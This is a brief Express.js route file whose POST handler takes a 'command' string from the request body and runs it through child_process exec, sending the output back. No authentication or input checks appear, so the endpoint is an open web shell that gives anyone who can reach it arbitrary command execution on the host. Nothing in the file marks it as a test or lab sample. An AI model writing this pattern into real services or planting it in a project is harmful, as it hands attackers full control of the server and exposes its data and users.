import express from 'express';
import { exec } from 'child_process';

const router = express.Router();

router.post('/', (req, res) => {
  const { command } = req.body;
  exec(command, (err, stdout, stderr) => {
    if (err) return res.send(stderr);
    res.send(stdout);
  });
});

export default router;
